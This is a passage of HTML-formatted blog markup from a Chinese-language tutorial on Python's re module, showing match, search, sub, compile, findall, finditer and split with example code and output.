不在起始位置匹配</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例运行输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(0, 3)</span><br><span class=\"line\">None</span><br></pre></td></tr></table></figure>\n\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">line = <span class=\"string\">&quot;Cats are smarter than dogs&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">matchObj = re.match( <span class=\"string\">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> matchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group(1) : &quot;</span>, matchObj.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group(2) : &quot;</span>, matchObj.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例执行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matchObj.group() :  Cats are smarter than dogs</span><br><span class=\"line\">matchObj.group(1) :  Cats</span><br><span class=\"line\">matchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-search方法\"><a href=\"#re模块-search方法\" class=\"headerlink\" title=\"re模块-search方法\"></a>re模块-search方法</h3><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>\n<p>函数语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>\n\n<p>函数参数说明：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>pattern</td>\n<td align=\"center\">匹配的正则表达式</td>\n</tr>\n<tr>\n<td>string</td>\n<td align=\"center\">要匹配的字符串</td>\n</tr>\n<tr>\n<td>flags</td>\n<td align=\"center\">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等</td>\n</tr>\n</tbody></table>\n<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p>\n<p>我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式</p>\n<table>\n<thead>\n<tr>\n<th>匹配对象方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>group(num=0)</td>\n<td>匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>\n</tr>\n<tr>\n<td>groups()</td>\n<td>返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-  </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.search(<span class=\"string\">&#x27;www&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>).span())  <span class=\"comment\"># 在起始位置匹配</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.search(<span class=\"string\">&#x27;com&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>).span())  <span class=\"comment\"># 不在起始位置匹配</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例运行输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(0, 3)</span><br><span class=\"line\">(11, 14)</span><br></pre></td></tr></table></figure>\n\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">line = <span class=\"string\">&quot;Cats are smarter than dogs&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">searchObj = re.search( <span class=\"string\">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> searchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;searchObj.group() : &quot;</span>, searchObj.group()</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;searchObj.group(1) : &quot;</span>, searchObj.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;searchObj.group(2) : &quot;</span>, searchObj.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;Nothing found!!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例执行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">searchObj.group() :  Cats are smarter than dogs</span><br><span class=\"line\">searchObj.group(1) :  Cats</span><br><span class=\"line\">searchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re-match与re-search的区别\"><a href=\"#re-match与re-search的区别\" class=\"headerlink\" title=\"re.match与re.search的区别\"></a>re.match与re.search的区别</h3><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">line = <span class=\"string\">&quot;Cats are smarter than dogs&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">matchObj = re.match( <span class=\"string\">r&#x27;dogs&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"><span class=\"keyword\">if</span> matchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;match --&gt; matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;No match!!&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">matchObj = re.search( <span class=\"string\">r&#x27;dogs&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"><span class=\"keyword\">if</span> matchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;search --&gt; searchObj.group() : &quot;</span>, matchObj.group()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例运行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No match!!</span><br><span class=\"line\">search --&gt; searchObj.group() :  dogs</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"检索和替换\"><a href=\"#检索和替换\" class=\"headerlink\" title=\"检索和替换\"></a>检索和替换</h3><p>Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。</p>\n<p>语法：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.sub(pattern, repl, string, count=<span class=\"number\">0</span>, flags=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>参数：</p>\n<ul>\n<li>pattern : 正则中的模式字符串。</li>\n<li>repl : 替换的字符串，也可为一个函数。</li>\n<li>string : 要被查找替换的原始字符串。</li>\n<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>\n</ul>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">phone = <span class=\"string\">&quot;2004-959-559 # 这是一个国外电话号码&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 删除字符串中的 Python注释 </span></span><br><span class=\"line\">num = re.sub(<span class=\"string\">r&#x27;#.*$&#x27;</span>, <span class=\"string\">&quot;&quot;</span>, phone)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;电话号码是: &quot;</span>, num</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 删除非数字(-)的字符串 </span></span><br><span class=\"line\">num = re.sub(<span class=\"string\">r&#x27;\\D&#x27;</span>, <span class=\"string\">&quot;&quot;</span>, phone)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;电话号码是 : &quot;</span>, num</span><br></pre></td></tr></table></figure>\n\n<p>以上实例执行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">电话号码是:  2004-959-559 </span><br><span class=\"line\">电话号码是 :  2004959559</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"repl-参数是一个函数\"><a href=\"#repl-参数是一个函数\" class=\"headerlink\" title=\"repl 参数是一个函数\"></a>repl 参数是一个函数</h3><p>以下实例中将字符串中的匹配的数字乘以 2：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 将匹配的数字乘以 2</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">double</span>(<span class=\"params\">matched</span>):</span></span><br><span class=\"line\">    value = <span class=\"built_in\">int</span>(matched.group(<span class=\"string\">&#x27;value&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span>(value * <span class=\"number\">2</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">s = <span class=\"string\">&#x27;A23G4HFD567&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.sub(<span class=\"string\">&#x27;(?P&lt;value&gt;\\d+)&#x27;</span>, double, s))</span><br></pre></td></tr></table></figure>\n\n<p>执行输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A46G8HFD1134</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-compile方法\"><a href=\"#re模块-compile方法\" class=\"headerlink\" title=\"re模块-compile方法\"></a>re模块-compile方法</h3><p>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p>\n<p>语法格式为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.compile(pattern[, flags])</span><br></pre></td></tr></table></figure>\n\n<p>参数：</p>\n<ul>\n<li><p>pattern : 一个字符串形式的正则表达式</p>\n</li>\n<li><p>flags : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：</p>\n<ol>\n<li><p><strong>re.I</strong> 忽略大小写</p>\n</li>\n<li><p><strong>re.L</strong> 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境</p>\n</li>\n<li><p><strong>re.M</strong> 多行模式</p>\n</li>\n<li><p><strong>re.S</strong> 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）</p>\n</li>\n<li><p><strong>re.U</strong> 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库</p>\n</li>\n<li><p><strong>re.X</strong> 为了增加可读性，忽略空格和 # 后面的注释</p>\n</li>\n</ol>\n</li>\n</ul>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt;<span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>pattern = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;\\d+&#x27;</span>)                    <span class=\"comment\"># 用于匹配至少一个数字</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;one12twothree34four&#x27;</span>)        <span class=\"comment\"># 查找头部，没有匹配</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m</span><br><span class=\"line\"><span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;one12twothree34four&#x27;</span>, <span class=\"number\">2</span>, <span class=\"number\">10</span>) <span class=\"comment\"># 从&#x27;e&#x27;的位置开始匹配，没有匹配</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m</span><br><span class=\"line\"><span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;one12twothree34four&#x27;</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>) <span class=\"comment\"># 从&#x27;1&#x27;的位置开始匹配，正好匹配</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m                                         <span class=\"comment\"># 返回一个 Match 对象</span></span><br><span class=\"line\">&lt;_sre.SRE_Match <span class=\"built_in\">object</span> at <span class=\"number\">0x10a42aac0</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">0</span>)   <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\"><span class=\"string\">&#x27;12&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.start(<span class=\"number\">0</span>)   <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\"><span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.end(<span class=\"number\">0</span>)     <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\"><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">0</span>)    <span class=\"comment\"># 可省略 0</span></span><br><span class=\"line\">(<span class=\"number\">3</span>, <span class=\"number\">5</span>)</span><br></pre></td></tr></table></figure>\n\n<p>在上面，当匹配成功时返回一个 Match 对象，其中：</p>\n<ul>\n<li><code>group([group1, …])</code> 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 <code>group()</code> 或 <code>group(0)</code>；</li>\n<li><code>start([group])</code> 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；</li>\n<li><code>end([group])</code> 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；</li>\n<li><code>span([group])</code> 方法返回 <code>(start(group), end(group))</code>。</li>\n</ul>\n<p>再看看一个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt;<span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>pattern = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;([a-z]+) ([a-z]+)&#x27;</span>, re.I)   <span class=\"comment\"># re.I 表示忽略大小写</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m = pattern.match(<span class=\"string\">&#x27;Hello World Wide Web&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">print</span> m                               <span class=\"comment\"># 匹配成功，返回一个 Match 对象</span></span><br><span class=\"line\">&lt;_sre.SRE_Match <span class=\"built_in\">object</span> at <span class=\"number\">0x10bea83e8</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">0</span>)                            <span class=\"comment\"># 返回匹配成功的整个子串</span></span><br><span class=\"line\"><span class=\"string\">&#x27;Hello World&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">0</span>)                             <span class=\"comment\"># 返回匹配成功的整个子串的索引</span></span><br><span class=\"line\">(<span class=\"number\">0</span>, <span class=\"number\">11</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">1</span>)                            <span class=\"comment\"># 返回第一个分组匹配成功的子串</span></span><br><span class=\"line\"><span class=\"string\">&#x27;Hello&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">1</span>)                             <span class=\"comment\"># 返回第一个分组匹配成功的子串的索引</span></span><br><span class=\"line\">(<span class=\"number\">0</span>, <span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">2</span>)                            <span class=\"comment\"># 返回第二个分组匹配成功的子串</span></span><br><span class=\"line\"><span class=\"string\">&#x27;World&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.span(<span class=\"number\">2</span>)                             <span class=\"comment\"># 返回第二个分组匹配成功的子串</span></span><br><span class=\"line\">(<span class=\"number\">6</span>, <span class=\"number\">11</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.groups()                            <span class=\"comment\"># 等价于 (m.group(1), m.group(2), ...)</span></span><br><span class=\"line\">(<span class=\"string\">&#x27;Hello&#x27;</span>, <span class=\"string\">&#x27;World&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>m.group(<span class=\"number\">3</span>)                            <span class=\"comment\"># 不存在第三个分组</span></span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, line <span class=\"number\">1</span>, <span class=\"keyword\">in</span> &lt;module&gt;</span><br><span class=\"line\">IndexError: no such group</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-findall方法\"><a href=\"#re模块-findall方法\" class=\"headerlink\" title=\"re模块-findall方法\"></a>re模块-findall方法</h3><p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</p>\n<p>match 和 search  是匹配一次 findall 匹配所有。</p>\n<p>语法格式为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">findall(string[, pos[, endpos]])</span><br></pre></td></tr></table></figure>\n\n<p>参数：</p>\n<ul>\n<li>string : 待匹配的字符串。</li>\n<li>pos : 可选参数，指定字符串的起始位置，默认为 0。</li>\n<li>endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。</li>\n</ul>\n<p>查找字符串中的所有数字：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:UTF8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">pattern = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&#x27;\\d+&#x27;</span>)   <span class=\"comment\"># 查找数字</span></span><br><span class=\"line\">result1 = pattern.findall(<span class=\"string\">&#x27;runoob 123 google 456&#x27;</span>)</span><br><span class=\"line\">result2 = pattern.findall(<span class=\"string\">&#x27;run88oob123google456&#x27;</span>, <span class=\"number\">0</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result2)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&#x27;123&#x27;, &#x27;456&#x27;]</span><br><span class=\"line\">[&#x27;88&#x27;, &#x27;12&#x27;]</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-finditer方法\"><a href=\"#re模块-finditer方法\" class=\"headerlink\" title=\"re模块-finditer方法\"></a>re模块-finditer方法</h3><p>和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.finditer(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># -*- coding: UTF-8 -*-</span><br><span class=\"line\"> </span><br><span class=\"line\">import re</span><br><span class=\"line\"> </span><br><span class=\"line\">it = re.finditer(r&quot;\\d+&quot;,&quot;12a32bc43jf3&quot;) </span><br><span class=\"line\">for match in it: </span><br><span class=\"line\">    print (match.group() )</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>输出结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">12 </span><br><span class=\"line\">32 </span><br><span class=\"line\">43 </span><br><span class=\"line\">3</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-split方法\"><a href=\"#re模块-split方法\" class=\"headerlink\" title=\"re模块-split方法\"></a>re模块-split方法</h3><p>split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.split(pattern, string[, maxsplit=0, flags=0])</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt;<span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;\\W+&#x27;</span>, <span class=\"string\">&#x27;runoob, runoob, runoob.&#x27;</span>)</span><br><span class=\"line\">[<span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;(\\W+)&#x27;</span>, <span class=\"string\">&#x27; runoob, runoob, runoob.&#x27;</span>) </span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;, &#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span 